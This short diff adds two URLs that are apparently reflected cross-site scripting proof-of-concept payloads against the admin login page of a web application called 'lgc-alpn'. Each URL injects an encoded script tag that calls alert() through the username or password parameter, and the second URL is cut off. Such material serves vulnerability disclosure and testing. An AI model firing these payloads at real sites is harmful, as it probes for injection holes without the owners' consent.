@@ -1,0 +1,2 @@
+http://www.example.com/lgc-alpn/admin/index.php?ToDo=processLogin?username=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;&amp;password=indoushka&amp;SubmitButton=Login
+http://www.example.com/lgc-alpn/admin/index.php?ToDo=processLogin?username=test&amp;password=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;&amp;SubmitButton=Logi
